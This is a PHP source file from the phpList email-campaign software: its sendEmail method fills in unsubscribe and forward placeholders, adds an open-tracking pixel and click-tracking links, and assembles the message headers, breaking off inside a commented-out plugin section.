<?php
/**
 * User: SaWey
 * Date: 18/12/13
 */

namespace phpList\helper;


use phpList;
use phpList\Config;
use phpList\Campaign;
use phpList\Subscriber;

class PrepareCampaign
{
    /**
     * @param Campaign $campaign
     * @param Subscriber $subscriber
     * @param bool $is_test_mail
     * @param array $forwardedby
     * @return bool
     */
    public static function sendEmail(
        $campaign,
        $subscriber,
        $is_test_mail = false,
        $forwardedby = array()
    ) {
        $get_speed_stats = Config::VERBOSE && Config::get('getspeedstats', false) !== false && (Timer::get('process_queue') != null);
        $sql_count_start = phpList::DB()->getQueryCount();

        ## for testing concurrency, put in a delay to check if multiple send processes cause duplicates
        #usleep(rand(0,10) * 1000000);

        if ($get_speed_stats) Output::output('sendEmail start ' . Timer::get('process_queue')->interval(1));

        #0013076: different content when forwarding 'to a friend'
        if (Config::FORWARD_ALTERNATIVE_CONTENT) {
            $forwardContent = sizeof($forwardedby) > 0;
        } else {
            $forwardContent = 0;
        }

        if (!Cache::isCampaignCached($campaign)){
            if (!PrepareCampaign::precacheCampaign($campaign, $forwardContent)) {
                Logger::logEvent('Error loading campaign ' . $campaign->id . '  in cache');
                return false;
            }
        } else {
            #  dbg("Using cached {$cached->fromemail}");
            if (Config::VERBOSE) Output::output('Using cached campaign');
        }

        $cached_campaign = Cache::getCachedCampaign($campaign);

        if (Config::VERBOSE) {
            Output::output(s('Sending campaign %d with subject %s to %s', $campaign->id, $cached_campaign->subject, $subscriber->getEmail()));
        }

        ## at this stage we don't know whether the content is HTML or text, it's just content
        $content = $cached_campaign->content;

        if ($get_speed_stats) {
            Output::output('Load subscriber start');
        }

        #0011857: forward to friend, retain attributes
        if ($subscriber->uniqid == 'forwarded' && Config::KEEPFORWARDERATTRIBUTES) {
            $subscriber = Subscriber::getSubscriberByEmail($forwardedby['email']);
        }

        $subscriber_att_values = $subscriber->getCleanAttributes();

        $html = $text = array();
        if (stripos($content, '[LISTS]') !== false) {
            $lists = MailingList::getListsForSubscriber($subscriber->id);
            if (!empty($lists)) {
                foreach($lists as $list){
                    $html['lists'] .= '<br/>' . $list->name;
                    $text['lists'] .= "\n" . $list->name;
                }
            } else {
                $html['lists'] = s('strNoListsFound');
                $text['lists'] = s('strNoListsFound');
            }
        }

        if ($get_speed_stats) {
            Output::output('Load subscriber end');
        }

        if ($cached_campaign->subscriberpecific_url) {
            if ($get_speed_stats) {
                Output::output('fetch personal URL start');
            }

            ## Fetch external content, only if the URL has placeholders
            //TODO: I changed can_fetchUrl to can_fetch_url -> make sure it's changed everywhere
            if (Config::get('can_fetch_url') && preg_match('/\[URL:([^\s]+)\]/i', $content, $regs)) {
                while (isset($regs[1]) && strlen($regs[1])) {
                    $url = $regs[1];
                    if (!preg_match('/^http/i', $url)) {
                        $url = 'http://' . $url;
                    }
                    $remote_content = Util::fetchUrl($url, $subscriber);

                    # @@ don't use this
                    #      $remote_content = includeStyles($remote_content);

                    if ($remote_content) {
                        $content = str_replace($regs[0], $remote_content, $content);
                        $cached_campaign->htmlformatted = strip_tags($content) != $content;
                    } else {
                        Logger::logEvent('Error fetching URL: '.$regs[1].' to send to ' . $subscriber->getEmail());
                        return 0;
                    }
                    preg_match('/\[URL:([^\s]+)\]/i', $content, $regs);
                }
            }
            if ($get_speed_stats) {
                Output::output('fetch personal URL end');
            }
        }

        if ($get_speed_stats) {
            Output::output('define placeholders start');
        }

        //TODO: can't we precache parts of the urls and the just use string concatenation for better performance
        $unsubscribe_url = Config::get('unsubscribeurl');
        ## https://mantis.phplist.com/view.php?id=16680 -> the "sep" should be & for the text links
        $sep = strpos($unsubscribe_url, '?') === false ? '?' : '&';

        $html['unsubscribe'] = sprintf(
            '<a href="%s%suid=%s">%s</a>',
            $unsubscribe_url,
            htmlspecialchars($sep),
            $subscriber->uniqid,
            s('Unsubscribe')
        );
        $text['unsubscribe'] = sprintf('%s%suid=%s', $unsubscribe_url, $sep, $subscriber->uniqid);
        $text['jumpoff'] = sprintf('%s%suid=%s&jo=1', $unsubscribe_url, $sep, $subscriber->uniqid);
        $html['unsubscribeurl'] = sprintf('%s%suid=%s', $unsubscribe_url, htmlspecialchars($sep), $subscriber->uniqid);
        $text['unsubscribeurl'] = sprintf('%s%suid=%s', $unsubscribe_url, $sep, $subscriber->uniqid);
        $text['jumpoffurl'] = sprintf('%s%suid=%s&jo=1', $unsubscribe_url, $sep, $subscriber->uniqid);

        #0013076: Blacklisting posibility for unknown subscribers
        $blacklist_url = Config::get('blacklisturl');
        $sep = strpos($blacklist_url, '?') === false ? '?' : '&';
        $html['blacklist'] = sprintf(
            '<a href="%s%semail=%s">%s</a>',
            $blacklist_url,
            htmlspecialchars($sep),
            $subscriber->getEmail(),
            s('Unsubscribe')
        );
        $text['blacklist'] = sprintf('%s%semail=%s', $blacklist_url, $sep, $subscriber->getEmail());
        $html['blacklisturl'] = sprintf('%s%semail=%s', $blacklist_url, htmlspecialchars($sep), $subscriber->getEmail());
        $text['blacklisturl'] = sprintf('%s%semail=%s', $blacklist_url, $sep, $subscriber->getEmail());

        #0013076: Problem found during testing: campaign part must be parsed correctly as well.
        if (sizeof($forwardedby) && isset($forwardedby['email'])) {
            $html['unsubscribe'] = $html['blacklist'];
            $text['unsubscribe'] = $text['blacklist'];
            $html['forwardedby'] = $forwardedby['email'];
            $text['forwardedby'] = $forwardedby['email'];
        }

        $subscribe_url = Config::get('subscribeurl');
        //$sep = strpos($subscribe_url, '?') === false ? '?' : '&';
        $html['subscribe'] = sprintf('<a href="%s">%s</a>', $subscribe_url, s('this link'));
        $text['subscribe'] = sprintf('%s', $subscribe_url);
        $html['subscribeurl'] = sprintf('%s', $subscribe_url);
        $text['subscribeurl'] = sprintf('%s', $subscribe_url);

        $forward_url = Config::get('forwardurl');
        $sep = strpos($forward_url, '?') === false ? '?' : '&';
        $html['forward'] = sprintf(
            '<a href="%s%suid=%s&amp;mid=%d">%s</a>',
            $forward_url,
            htmlspecialchars($sep),
            $subscriber->uniqid,
            $campaign->id,
            s('this link')
        );
        $text['forward'] = sprintf('%s%suid=%s&mid=%d', $forward_url, $sep, $subscriber->uniqid, $campaign->id);
        $html['forwardurl'] = sprintf('%s%suid=%s&amp;mid=%d', $forward_url, htmlspecialchars($sep), $subscriber->uniqid, $campaign->id);
        $text['forwardurl'] = $text['forward'];
        $html['campaignid'] = $text['campaignid'] = sprintf('%d', $campaign->id);

        # make sure there are no newlines, otherwise they get turned into <br/>s
        $html['forwardform'] = sprintf(
            '<form method="get" action="%s" name="forwardform" class="forwardform"><input type="hidden" name="uid" value="%s" /><input type="hidden" name="mid" value="%d" /><input type="hidden" name="p" value="forward" /><input type=text name="email" value="" class="forwardinput" /><input name="Send" type="submit" value="%s" class="forwardsubmit"/></form>',
            $forward_url,
            $subscriber->uniqid,
            $campaign->id,
            Config::get('strForward')
        );
        $text['signature'] = "\n\n-- powered by phpList, www.phplist.com --\n\n";
        $preferences_url = Config::get('preferencesurl');
        $sep = strpos($preferences_url, '?') === false ? '?' : '&';
        $html['preferences'] = sprintf(
            '<a href="%s%suid=%s">%s</a>',
            $preferences_url,
            htmlspecialchars($sep),
            $subscriber->uniqid,
            s('this link')
        );
        $text['preferences'] = sprintf('%s%suid=%s', $preferences_url, $sep, $subscriber->uniqid);
        $html['preferencesurl'] = sprintf('%s%suid=%s', $preferences_url, htmlspecialchars($sep), $subscriber->uniqid);
        $text['preferencesurl'] = sprintf('%s%suid=%s', $preferences_url, $sep, $subscriber->uniqid);

        $confirmation_url = Config::get('confirmationurl');
        $sep = strpos($confirmation_url, '?') === false ? '?' : '&';
        $html['confirmationurl'] = sprintf('%s%suid=%s', $confirmation_url, htmlspecialchars($sep), $subscriber->uniqid);
        $text['confirmationurl'] = sprintf('%s%suid=%s', $confirmation_url, $sep, $subscriber->uniqid);

        #historical, not sure it's still used
        $html['userid'] = $text['userid'] = $subscriber->uniqid;

        $html['website'] = $text['website'] = Config::get('website'); # Your website's address, e.g. www.yourdomain.com
        $html['domain'] = $text['domain'] = Config::get('domain'); # Your domain, e.g. yourdomain.com

        if ($subscriber->uniqid != 'forwarded') {
            $text['footer'] = $cached_campaign->textfooter;
            $html['footer'] = $cached_campaign->htmlfooter;
        } else {
            #0013076: different content when forwarding 'to a friend'
            if (Config::FORWARD_ALTERNATIVE_CONTENT) {
                $text['footer'] = stripslashes($campaign->forwardfooter);
            } else {
                $text['footer'] = Config::get('forwardfooter');
            }
            $html['footer'] = $text['footer'];
        }

        /*
          We request you retain the signature below in your emails including the links.
          This not only gives respect to the large amount of time given freely
          by the developers  but also helps build interest, traffic and use of
          phpList, which is beneficial to it's future development.

          You can configure how the credits are added to your pages and emails in your
          config file.

          Michiel Dethmers, phpList Ltd 2003 - 2013
        */
        if (!Config::EMAILTEXTCREDITS) {
            $html['signature'] = Config::get('PoweredByImage'); #'<div align="center" id="signature"><a href="http://www.phplist.com"><img src="powerphplist.png" width=88 height=31 title="Powered by PHPlist" alt="Powered by PHPlist" border="0" /></a></div>';
            # oops, accidentally became spyware, never intended that, so take it out again :-)
            $html['signature'] = preg_replace(
                '/src=".*power-phplist.png"/',
                'src="powerphplist.png"',
                $html['signature']
            );
        } else {
            $html['signature'] = Config::get('PoweredByText');
        }
        #  $content = $cached->htmlcontent;

        if ($get_speed_stats) {
            Output::output('define placeholders end');
        }

        ## Fill text and html versions depending on given versions.

        if ($get_speed_stats) {
            Output::output('parse text to html or html to text start');
        }

        if ($cached_campaign->htmlformatted) {
            if (empty($cached_campaign->textcontent)) {
                $textcontent = String::HTML2Text($content);
            } else {
                $textcontent = $cached_campaign->textcontent;
            }
            $htmlcontent = $content;
        } else {
            if (empty($cached_campaign->textcontent)) {
                $textcontent = $content;
            } else {
                $textcontent = $cached_campaign->textcontent;
            }
            $htmlcontent = PrepareCampaign::parseText($content);
        }

        if ($get_speed_stats) {
            Output::output('parse text to html or html to text end');
        }

        $defaultstyle = Config::get('html_email_style');
        $adddefaultstyle = 0;

        if ($get_speed_stats) {
            Output::output('merge into template start');
        }

        if ($cached_campaign->template)
            # template used
            $htmlcampaign = str_replace('[CONTENT]', $htmlcontent, $cached_campaign->template);
        else {
            # no template used
            $htmlcampaign = $htmlcontent;
            $adddefaultstyle = 1;
        }
        $textcampaign = $textcontent;

        if ($get_speed_stats) {
            Output::output('merge into template end');
        }
        ## Parse placeholders

        if ($get_speed_stats) {
            Output::output('parse placeholders start');
        }


        /*
          var_dump($html);
          var_dump($subscriberdata);
          var_dump($subscriber_att_values);
          exit;
        */


        #print htmlspecialchars($htmlcampaign);exit;

        ### @@@TODO don't use forward and forward form in a forwarded campaign as it'll fail

        if (strpos($htmlcampaign, '[FOOTER]') !== false)
            $htmlcampaign = str_ireplace('[FOOTER]', $html['footer'], $htmlcampaign);
        elseif ($html['footer'])
            $htmlcampaign = PrepareCampaign::addHTMLFooter($htmlcampaign, '<br />' . $html['footer']);

        if (strpos($htmlcampaign, '[SIGNATURE]') !== false) {
            $htmlcampaign = str_ireplace('[SIGNATURE]', $html['signature'], $htmlcampaign);
        } else {
        # BUGFIX 0015303, 2/2
        //    $htmlcampaign .= '<br />'.$html['signature'];
            $htmlcampaign = PrepareCampaign::addHTMLFooter(
                $htmlcampaign,
                '
               ' . $html['signature']
            );
        }


        # END BUGFIX 0015303, 2/2

        if (strpos($textcampaign, '[FOOTER]'))
            $textcampaign = str_ireplace('[FOOTER]', $text['footer'], $textcampaign);
        else
            $textcampaign .= "\n\n" . $text['footer'];

        if (strpos($textcampaign, '[SIGNATURE]'))
            $textcampaign = str_ireplace('[SIGNATURE]', $text['signature'], $textcampaign);
        else
            $textcampaign .= "\n" . $text['signature'];

        ### addition to handle [FORWARDURL:Campaign ID:Link Text] (link text optional)

        while (preg_match('/\[FORWARD:([^\]]+)\]/Uxm', $htmlcampaign, $regs)) {
            $newforward = $regs[1];
            $matchtext = $regs[0];
            if (strpos($newforward, ':')) {
                ## using FORWARDURL:campaignid:linktext
                list($forwardcampaign, $forwardtext) = explode(':', $newforward);
            } else {
                $forwardcampaign = sprintf('%d', $newforward);
                $forwardtext = 'this link';
            }
            if (!empty($forwardcampaign)) {
                $sep = strpos($forward_url, '?') === false ? '?' : '&';
                $forwardurl = sprintf('%s%suid=%s&mid=%d', $forward_url, $sep, $subscriber->uniqid, $forwardcampaign);
                $htmlcampaign = str_replace(
                    $matchtext,
                    '<a href="' . htmlspecialchars($forwardurl) . '">' . $forwardtext . '</a>',
                    $htmlcampaign
                );
            } else {
                ## make sure to remove the match, otherwise, it'll be an eternal loop
                $htmlcampaign = str_replace($matchtext, '', $htmlcampaign);
            }
        }

        ## the text campaign has to be parsed seperately, because the line might wrap if the text for the link is long, so the match text is different
        while (preg_match('/\[FORWARD:([^\]]+)\]/Uxm', $textcampaign, $regs)) {
            $newforward = $regs[1];
            $matchtext = $regs[0];
            if (strpos($newforward, ':')) {
                ## using FORWARDURL:campaignid:linktext
                list($forwardcampaign, $forwardtext) = explode(':', $newforward);
            } else {
                $forwardcampaign = sprintf('%d', $newforward);
                $forwardtext = 'this link';
            }
            if (!empty($forwardcampaign)) {
                $sep = strpos($forward_url, '?') === false ? '?' : '&';
                $forwardurl = sprintf('%s%suid=%s&mid=%d', $forward_url, $sep, $subscriber->uniqid, $forwardcampaign);
                $textcampaign = str_replace($matchtext, $forwardtext . ' ' . $forwardurl, $textcampaign);
            } else {
                ## make sure to remove the match, otherwise, it'll be an eternal loop
                $textcampaign = str_replace($matchtext, '', $textcampaign);
            }
        }

        #  $req = Sql_Query(sprintf('select filename,data from %s where template = %d',
        #    Config::getTableName('templateimage'),$cached->templateid));

        if (Config::ALWAYS_ADD_USERTRACK) {
            if (stripos($htmlcampaign, '</body>')) {
                $htmlcampaign = str_replace(
                    '</body>',
                    '<img src="' . Config::get('public_scheme') . '://' . Config::get('website') .
                    Config::PAGEROOT . '/ut.php?u=' . $subscriber->uniqid . '&amp;m=' . $campaign->id .
                    '" width="1" height="1" border="0" /></body>',
                    $htmlcampaign
                );
            } else {
                $htmlcampaign .= '<img src="' . Config::get('public_scheme') . '://' . Config::get('website') .
                    Config::PAGEROOT . '/ut.php?u=' . $subscriber->uniqid . '&amp;m=' . $campaign->id .
                    '" width="1" height="1" border="0" />';
            }
        } else {
            ## can't use str_replace or str_ireplace, because those replace all, and we only want to replace one
            $htmlcampaign = preg_replace(
                '/\[USERTRACK\]/i',
                '<img src="' . Config::get('public_scheme') . '://' . Config::get('website') .
                Config::PAGEROOT . '/ut.php?u=' . $subscriber->uniqid . '&amp;m=' . $campaign->id .
                '" width="1" height="1" border="0" />',
                $htmlcampaign,
                1
            );
        }
        # make sure to only include subscribertrack once, otherwise the stats would go silly
        $htmlcampaign = str_ireplace('[USERTRACK]', '', $htmlcampaign);

        $html['subject'] = $text['subject'] = $cached_campaign->subject;

        $htmlcampaign = PrepareCampaign::parsePlaceHolders($htmlcampaign, $html);
        $textcampaign = PrepareCampaign::parsePlaceHolders($textcampaign, $text);

        if ($get_speed_stats) {
            Output::output('parse placeholders end');
        }

        if ($get_speed_stats) {
            Output::output('parse subscriberdata start');
        }

        $subscriberdata = array();
        foreach(Subscriber::$DB_ATTRIBUTES as $key){
            $subscriberdata[$key] = $subscriber->$key;
        }
        $htmlcampaign = PrepareCampaign::parsePlaceHolders($htmlcampaign, $subscriberdata);
        $textcampaign = PrepareCampaign::parsePlaceHolders($textcampaign, $subscriberdata);

        //CUT 2

        $destinationemail = '';
        if (is_array($subscriber_att_values)) {
        // CUT 3
            $htmlcampaign = PrepareCampaign::parsePlaceHolders($htmlcampaign, $subscriber_att_values);
            $textcampaign = PrepareCampaign::parsePlaceHolders($textcampaign, $subscriber_att_values);
        }

        if ($get_speed_stats) {
            Output::output('parse subscriberdata end');
        }

        if (!$destinationemail) {
            $destinationemail = $subscriber->getEmail();
        }

        # this should move into a plugin
        if (strpos($destinationemail, '@') === false && Config::get('expand_unqualifiedemail', false) !== false) {
            $destinationemail .= Config::get('expand_unqualifiedemail');
        }

        if ($get_speed_stats) {
            Output::output('pass to plugins for destination email start');
        }
        /*TODO: enable plugins
        foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
        #    print "Checking Destination for ".$plugin->name."<br/>";
            $destinationemail = $plugin->setFinalDestinationEmail($campaign->id, $subscriber_att_values, $destinationemail);
        }
        if ($getspeedstats) {
            Output::output('pass to plugins for destination email end');
        }

        foreach ($GLOBALS['plugins'] as $pluginname => $plugin) {
            $textcampaign = $plugin->parseOutgoingTextCampaign($campaign->id, $textcampaign, $destinationemail, $subscriberdata);
            $htmlcampaign = $plugin->parseOutgoingHTMLCampaign($campaign->id, $htmlcampaign, $destinationemail, $subscriberdata);
        }*/

        ## click tracking
        # for now we won't click track forwards, as they are not necessarily subscribers, so everything would fail
        if ($get_speed_stats) {
            Output::output('click track start');
        }

        if (Config::CLICKTRACK && $subscriber->uniqid != 'forwarded') {
            $urlbase = '';
            # let's leave this for now
            /*
            if (preg_match('/<base href="(.*)"([^>]*)>/Umis',$htmlcampaign,$regs)) {
              $urlbase = $regs[1];
            } else {
              $urlbase = '';
            }
        #    print "URLBASE: $urlbase<br/>";
            */

            # convert html campaign
            #preg_match_all('/<a href="?([^> "]*)"?([^>]*)>(.*)<\/a>/Umis',$htmlcampaign,$links);
            preg_match_all('/<a (.*)href=["\'](.*)["\']([^>]*)>(.*)<\/a>/Umis', $htmlcampaign, $links);

            # to process the Yahoo webpage with base href and link like <a href=link> we'd need this one
            #preg_match_all('/<a href=([^> ]*)([^>]*)>(.*)<\/a>/Umis',$htmlcampaign,$links);
            $clicktrack_root = sprintf('%s://%s/lt.php', Config::get('public_scheme'), Config::get('website') . Config::PAGEROOT);
            for ($i = 0; $i < count($links[2]); $i++) {
                $link = Util::cleanUrl($links[2][$i]);
                $link = str_replace('"', '', $link);
                if (preg_match('/\.$/', $link)) {
                    $link = substr($link, 0, -1);
                }
                //$linkid = 0;

                $linktext = $links[4][$i];

                ## if the link is text containing a "protocol" eg http:// then do not track it, otherwise
                ## it will look like Phishing
                ## it's ok when the link is an image
                $linktext = strip_tags($linktext);
                $looks_like_phishing = stripos($linktext, 'https://') !== false || stripos(
                        $linktext,
                        'http://'
                    ) !== false;

                if (!$looks_like_phishing && (preg_match('/^http|ftp/', $link) || preg_match(
                            '/^http|ftp/',
                            $urlbase
                        )) && (stripos($link, 'www.phplist.com') === false) && !strpos($link, $clicktrack_root)
                ) {
                    # take off personal uids
                    $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));

                    #$url = preg_replace('/&uid=[^\s&]+/','',$link);

                    #if (!strpos('http:',$link)) {
                    #   $link = $urlbase . $link;
                    #}

                    $linkid = PrepareCampaign::clickTrackLinkId($campaign->id, $subscriber->id, $url, $link);

                    $masked = "H|$linkid|$campaign->id|" . $subscriber->id ^ Config::get('XORmask');
                    $masked = base64_encode($masked);
                    ## 15254- the encoding adds one or two extraneous = signs, take them off
                    $masked = preg_replace('/=$/', '', $masked);
                    $masked = preg_replace('/=$/', '', $masked);
                    $masked = urlencode($masked);

                    if (Config::get('CLICKTRACK_LINKMAP', false) === false) {
                        $newlink = sprintf(
                            '<a %shref="%s://%s/lt.php?id=%s" %s>%s</a>',
                            $links[1][$i],
                            Config::get('public_scheme'),
                            Config::get('website') . Config::PAGEROOT,
                            $masked,
                            $links[3][$i],
                            $links[4][$i]
                        );
                    } else {
                        $newlink = sprintf(
                            '<a %shref="%s://%s%s" %s>%s</a>',
                            $links[1][$i],
                            Config::get('public_scheme'),
                            Config::get('website') . Config::get('CLICKTRACK_LINKMAP'),
                            $masked,
                            $links[3][$i],
                            $links[4][$i]
                        );
                    }
                    $htmlcampaign = str_replace($links[0][$i], $newlink, $htmlcampaign);
                }
            }

            # convert Text campaign
            # first find occurances of our top domain, to avoid replacing them later

            # hmm, this is no point, it's not just *our* topdomain, but any

            if (0) {
                preg_match_all('#(https?://' . Config::get('website') . '/?)\s+#mis', $textcampaign, $links);
                #preg_match_all('#(https?://[a-z0-9\./\#\?&:@=%\-]+)#ims',$textcampaign,$links);
                #preg_match_all('!(https?:\/\/www\.[a-zA-Z0-9\.\/#~\?+=&%@-_]+)!mis',$textcampaign,$links);

                for ($i = 0; $i < count($links[1]); $i++) {
                    # not entirely sure why strtolower was used, but it seems to break things http://mantis.phplist.com/view.php?id=4406
                    #$link = strtolower(cleanUrl($links[1][$i]));
                    $link = Util::cleanUrl($links[1][$i]);
                    if (preg_match('/\.$/', $link)) {
                        $link = substr($link, 0, -1);
                    }
                    $linkid = 0;
                    if (preg_match('/^http|ftp/', $link)
                        && (stripos($link, 'www.phplist.com') === false)
                        && !strpos($link, $clicktrack_root)
                    ) {
                        $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));
                        phpList::DB()->query(sprintf(
                                'INSERT IGNORE INTO %s (campaignid, userid, url, forward)
                                 VALUES(%d, %d, "%s", "%s")',
                                Config::getTableName('linktrack'),
                                $campaign->id,
                                $subscriber->id,
                                $url,
                                $link
                            ));
                        $req = phpList::DB()->fetchRowQuery(sprintf(
                                'SELECT linkid FROM %s
                                WHERE campaignid = %s
                                AND userid = %d
                                AND forward = "%s"',
                                Config::getTableName('linktrack'),
                                $campaign->id,
                                $subscriber->id,
                                $link
                            )
                        );
                        $linkid = $req[0];

                        $masked = "T|$linkid|$campaign->id|" . $subscriber->id ^ Config::get('XORmask');
                        $masked = urlencode(base64_encode($masked));
                        $newlink = sprintf(
                            '%s://%s/lt.php?id=%s',
                            Config::get('public_scheme'),
                            Config::get('website') . Config::PAGEROOT,
                            $masked
                        );
                        $textcampaign = str_replace($links[0][$i], '<' . $newlink . '>', $textcampaign);
                    }
                }

            }
            #now find the rest
            # @@@ needs to expand to find complete urls like:
            #http://user:password@www.web-site.com:1234/document.php?parameter=something&otherpar=somethingelse#anchor
            # or secure
            #https://user:password@www.website.com:2345/document.php?parameter=something%20&otherpar=somethingelse#anchor

            preg_match_all('#(https?://[^\s\>\}\,]+)#mis', $textcampaign, $links);
            #preg_match_all('#(https?://[a-z0-9\./\#\?&:@=%\-]+)#ims',$textcampaign,$links);
            #preg_match_all('!(https?:\/\/www\.[a-zA-Z0-9\.\/#~\?+=&%@-_]+)!mis',$textcampaign,$links);
            ## sort the results in reverse order, so that they are replaced correctly
            rsort($links[1]);
            $newlinks = array();

            for ($i = 0; $i < count($links[1]); $i++) {
                $link = Util::cleanUrl($links[1][$i]);
                if (preg_match('/\.$/', $link)) {
                    $link = substr($link, 0, -1);
                }

                $linkid = 0;
                if (preg_match('/^http|ftp/', $link)
                    && stripos($link, 'www.phplist.com') === false
                ) { # && !strpos($link,$clicktrack_root)) {
                    $url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));

                    $linkid = PrepareCampaign::clickTrackLinkId($campaign->id, $subscriber->id, $url, $link);

                    $masked = "T|$linkid|$campaign->id|" . $subscriber->id ^ Config::get('XORmask');
                    $masked = base64_encode($masked);
                    ## 15254- the encoding adds one or two extraneous = signs, take them off
                    $masked = preg_replace('/=$/', '', $masked);
                    $masked = preg_replace('/=$/', '', $masked);
                    $masked = urlencode($masked);
                    if (Config::get('CLICKTRACK_LINKMAP', false) === false) {
                        $newlinks[$linkid] = sprintf(
                            '%s://%s/lt.php?id=%s',
                            Config::get('public_scheme'),
                            Config::get('website') . Config::PAGEROOT,
                            $masked
                        );
                    } else {
                        $newlinks[$linkid] = sprintf(
                            '%s://%s%s',
                            Config::get('public_scheme'),
                            Config::get('website') . Config::get('CLICKTRACK_LINKMAP'),
                            $masked
                        );
                    }

                    #print $links[0][$i] .' -> '.$newlink.'<br/>';
                    $textcampaign = str_replace($links[1][$i], '[%%%' . $linkid . '%%%]', $textcampaign);
                }
            }
            foreach ($newlinks as $linkid => $newlink) {
                $textcampaign = str_replace('[%%%' . $linkid . '%%%]', $newlink, $textcampaign);
            }
        }
        if ($get_speed_stats) {
            Output::output('click track end');
        }

        ## if we're not tracking clicks, we should add Google tracking here
        ## otherwise, we can add it when redirecting on the click
        if (!Config::CLICKTRACK && !empty($cached_campaign->google_track)) {
            preg_match_all('/<a (.*)href=["\'](.*)["\']([^>]*)>(.*)<\/a>/Umis', $htmlcampaign, $links);
            for ($i = 0; $i < count($links[2]); $i++) {
                $link = Util::cleanUrl($links[2][$i]);
                $link = str_replace('"', '', $link);
                ## http://www.google.com/support/analytics/bin/answer.py?hl=en&answer=55578

                $trackingcode = 'utm_source=emailcampaign' . $campaign->id .
                    '&utm_medium=phpList&utm_content=HTMLemail&utm_campaign=' . urlencode($cached_campaign->subject);
                ## take off existing tracking code, if found
                if (strpos($link, 'utm_medium') !== false) {
                    $link = preg_replace('/utm_(\w+)\=[^&]+&/U', '', $link);
                }

                if (strpos($link, '?')) {
                    $newurl = $link . '&' . $trackingcode;
                } else {
                    $newurl = $link . '?' . $trackingcode;
                }
                #   print $link. ' '.$newurl.' <br/>';
                $newlink = sprintf('<a %shref="%s" %s>%s</a>', $links[1][$i], $newurl, $links[3][$i], $links[4][$i]);
                $htmlcampaign = str_replace($links[0][$i], $newlink, $htmlcampaign);
            }

            preg_match_all('#(https?://[^\s\>\}\,]+)#mis', $textcampaign, $links);
            rsort($links[1]);
            $newlinks = array();

            for ($i = 0; $i < count($links[1]); $i++) {
                $link = Util::cleanUrl($links[1][$i]);
                if (preg_match('/\.$/', $link)) {
                    $link = substr($link, 0, -1);
                }

                if (preg_match('/^http|ftp/', $link)
                    && (stripos($link, 'www.phplist.com') !== 0)
                ) { # && !strpos($link,$clicktrack_root)) {
                    //$url = Util::cleanUrl($link, array('PHPSESSID', 'uid'));
                    $trackingcode = 'utm_source=emailcampaign' . $campaign->id .
                        '&utm_medium=phpList&utm_content=textemail&utm_campaign=' . urlencode($cached_campaign->subject);
                    ## take off existing tracking code, if found
                    if (strpos($link, 'utm_medium') !== false) {
                        $link = preg_replace('/utm_(\w+)\=[^&]+/', '', $link);
                    }
                    if (strpos($link, '?')) {
                        $newurl = $link . '&' . $trackingcode;
                    } else {
                        $newurl = $link . '?' . $trackingcode;
                    }

                    $newlinks[$i] = $newurl;
                    $textcampaign = str_replace($links[1][$i], '[%%%' . $i . '%%%]', $textcampaign);
                }
            }
            foreach ($newlinks as $linkid => $newlink) {
                $textcampaign = str_replace('[%%%' . $linkid . '%%%]', $newlink, $textcampaign);
            }
            unset($newlinks);
        }

        #print htmlspecialchars($htmlcampaign);exit;

        #0011996: forward to friend - personal campaign
        if (Config::FORWARD_PERSONAL_NOTE_SIZE && $subscriber->uniqid == 'forwarded' && !empty($forwardedby['personalNote'])) {
            $htmlcampaign = nl2br($forwardedby['personalNote']) . '<br/>' . $htmlcampaign;
            $textcampaign = $forwardedby['personalNote'] . "\n" . $textcampaign;
        }
        if ($get_speed_stats) {
            Output::output('cleanup start');
        }

        ## allow fallback to default value for the ones that do not have a value
        ## delimiter is %% to avoid interfering with markup

        preg_match_all('/\[.*\%\%([^\]]+)\]/Ui', $htmlcampaign, $matches);
        for ($i = 0; $i < count($matches[0]); $i++) {
            $htmlcampaign = str_ireplace($matches[0][$i], $matches[1][$i], $htmlcampaign);
        }
        preg_match_all('/\[.*\%\%([^\]]+)\]/Ui', $textcampaign, $matches);
        for ($i = 0; $i < count($matches[0]); $i++) {
            $textcampaign = str_ireplace($matches[0][$i], $matches[1][$i], $textcampaign);
        }

        ## remove any remaining placeholders
        ## 16671 - do not do this, as it'll remove conditional CSS and other stuff
        ## that we'd like to keep
        //$htmlcampaign = preg_replace("/\[[A-Z\. ]+\]/i","",$htmlcampaign);
        //$textcampaign = preg_replace("/\[[A-Z\. ]+\]/i","",$textcampaign);
        #print htmlspecialchars($htmlcampaign);exit;

        # check that the HTML campaign as proper <head> </head> and <body> </body> tags
        # some readers fail when it doesn't
        if (!preg_match("#<body.*</body>#ims", $htmlcampaign)) {
            $htmlcampaign = '<body>' . $htmlcampaign . '</body>';
        }
        if (!preg_match("#<head.*</head>#ims", $htmlcampaign)) {
            if (!$adddefaultstyle) {
                $defaultstyle = "";
            }
            $htmlcampaign = '<head>
        <meta content="text/html;charset=' . $cached_campaign->html_charset . '" http-equiv="Content-Type">
        <title></title>' . $defaultstyle . '</head>' . $htmlcampaign;
        }
        if (!preg_match("#<html.*</html>#ims", $htmlcampaign)) {
            $htmlcampaign = '<html>' . $htmlcampaign . '</html>';
        }

        ## remove trailing code after </html>
        $htmlcampaign = preg_replace('#</html>.*#msi', '</html>', $htmlcampaign);

        ## the editor sometimes places <p> and </p> around the URL
        $htmlcampaign = str_ireplace('<p><!DOCTYPE', '<!DOCTYPE', $htmlcampaign);
        $htmlcampaign = str_ireplace('</html></p>', '</html>', $htmlcampaign);

        if ($get_speed_stats) {
            Output::output('cleanup end');
        }
#  $htmlcampaign = compressContent($htmlcampaign);

        # print htmlspecialchars($htmlcampaign);exit;

        if ($get_speed_stats) Output::output('build Start ' . Config::get('processqueue_timer')->interval(1));

        # build the email
        $mail = new phpListMailer($campaign->id, $destinationemail);
        if ($forwardedby) {
            $mail->add_timestamp();
        }
        $mail->addCustomHeader("List-Help: <" . $text['preferences'] . ">");
        $mail->addCustomHeader("List-Unsubscribe: <" . $text['jumpoffurl'] . ">");
        $mail->addCustomHeader("List-Subscribe: <" . Config::get("subscribeurl") . ">");
        $mail->addCustomHeader("List-Owner: <mailto:" . Config::get("admin_address") . ">");

        list($dummy, $domaincheck) = explode('@', $destinationemail);
        $text_domains = explode("\n", trim(Config::get("alwayssendtextto")));
        if (in_array($domaincheck, $text_domains)) {
            $subscriber->htmlemail = 0;
            if (Config::VERBOSE)
                Output::output(s('sendingtextonlyto') . " $domaincheck");
        }
        /*TODO: enable plugins
        foreach (Config::get('plugins') as $pluginname => $plugin) {
